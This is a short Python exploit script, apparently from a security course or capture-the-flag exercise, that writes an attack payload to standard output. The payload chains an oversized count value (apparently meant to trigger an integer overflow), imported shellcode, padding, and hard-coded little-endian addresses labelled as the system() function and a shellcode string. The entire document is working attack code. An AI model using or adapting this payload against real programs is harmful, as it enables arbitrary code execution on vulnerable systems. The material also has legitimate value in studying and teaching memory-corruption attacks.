
import sys
from shellcode import shellcode
count = b"1073741838"
addr = 0x804fef0.to_bytes(4, "little") #system address
addr2 = 0xfff6b998.to_bytes(4, "little") #shellcode string
sys.stdout.buffer.write(count + shellcode + b"A"*3 + addr + addr2)
